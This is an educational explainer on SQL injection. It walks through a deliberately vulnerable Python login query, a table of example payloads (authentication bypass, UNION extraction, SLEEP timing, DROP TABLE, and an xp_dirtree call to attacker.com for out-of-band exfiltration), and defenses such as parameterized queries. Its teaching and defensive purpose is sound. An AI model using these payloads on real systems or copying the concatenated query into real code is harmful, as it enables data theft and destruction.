### 💣 What is SQL Injection?

**SQL Injection** is a type of **security vulnerability** where an attacker **injects malicious SQL code** into input fields or parameters to **manipulate the backend database**.

🔍 **Main Goal:**  
Access, modify, or delete data without authorization (e.g., bypassing login, extracting passwords, dropping tables).

---

### 🔐 Why is SQL Injection Dangerous?

- Attackers can **bypass authentication**
- Retrieve **sensitive data** (e.g., usernames, passwords, credit card numbers)
- **Modify or delete** database contents
- In some cases, even **take control of the server**

---

### 🧪 Simple Example of Vulnerable Code

Let’s say we have a login form that takes `username` and `password`:

```
SELECT * FROM users WHERE username = 'admin' AND password = '1234';
```

Now imagine this query is constructed using raw user input:

```
# Insecure code example
username = input("Enter username:")
password = input("Enter password:")
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';"
```

### 😈 Attacker Input:

- Username: `admin' --`
- Password: _(anything)_

This results in the following query:

```
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

- The `--` starts a comment in SQL, so the rest is ignored.
- The query becomes: `SELECT * FROM users WHERE username = 'admin'` (no password check!)

✅ The attacker is logged in without a valid password!

---

### 💥 Types of SQL Injection

#### 1. **Classic (In-band) SQLi**

Uses the same communication channel to both inject and retrieve data.

**Example:**
```
' OR '1'='1
```
```
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```
Always returns true, logs in any user.

---

#### 2. **Blind SQL Injection**

No error messages or visible output, but the attacker gets responses through **true/false logic**.

**Example:**

```
admin' AND 1=1 --    ✅ True
admin' AND 1=2 --    ❌ False
```

Used to infer database behavior.

---

#### 3. **Out-of-Band SQL Injection**

Data is extracted using **external channels** (e.g., DNS, HTTP requests) — rare but powerful.

---
### 📊 **Common SQL Injection Types – Tabular Format**

|**Type**|**Description**|**Example Payload**|**Goal/Impact**|
|---|---|---|---|
|**Union-Based SQLi**|Uses `UNION` to combine results from multiple SELECT queries.|`' UNION SELECT username, password FROM users --`|Extracts data from other tables in the database.|
|**Error-Based SQLi**|Forces DB to generate error messages that leak information.|`' ORDER BY 100 --`|Helps discover table/column structure.|
|**Boolean-Based Blind SQLi**|Uses true/false conditions to infer database content (no errors shown).|`' AND 1=1 --`  <br>`' AND 1=2 --`|Confirms behavior of query using logic testing.|
|**Time-Based Blind SQLi**|Uses delays like `SLEEP()` to infer data based on response time.|`' OR IF(1=1, SLEEP(5), 0) --`|Confirms conditions or extracts data via response delay.|
|**Out-of-Band SQLi**|Uses external servers (DNS, HTTP) for data exfiltration.|`'; EXEC xp_dirtree '\\attacker.com\folder' --`|Sends data to attacker-controlled domain.|
|**Stacked Queries**|Executes multiple queries in one statement using `;` separator.|`'; DROP TABLE users; --`|Executes harmful secondary commands like deleting tables.|

---
### 🛡️ Summary of Defense Techniques:

| **Defense Method**       | **Purpose**                                                             |
| ------------------------ | ----------------------------------------------------------------------- |
| Prepared Statements      | Avoid SQL code execution via direct user input.                         |
| Input Validation         | Accept only safe, expected input formats.                               |
| Use ORM Frameworks       | Abstract SQL code to reduce direct query handling.                      |
| Least Privilege Access   | Limit what the database user account can do (e.g., no DROP permission). |
| Web Application Firewall | Detects and blocks common SQLi patterns.                                |

---
### 🧱 How to Prevent SQL Injection

✅ **Use Prepared Statements / Parameterized Queries**  
Avoid string concatenation in SQL queries.

**Example in Python with SQLite:**

```
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

✅ **Use ORM (Object Relational Mapping)**  
Frameworks like Django or SQLAlchemy reduce the risk.

✅ **Input Validation & Whitelisting**  
Only allow expected values.

✅ **Limit Database Permissions**  
E.g., app users should not have DROP TABLE rights.

✅ **Use Web Application Firewalls (WAF)**  
They can detect and block injection attempts.

---

### 🔐 Real-World Example:

In 2009, **Heartland Payment Systems** was hacked due to SQL injection. Over **130 million credit card numbers** were stolen.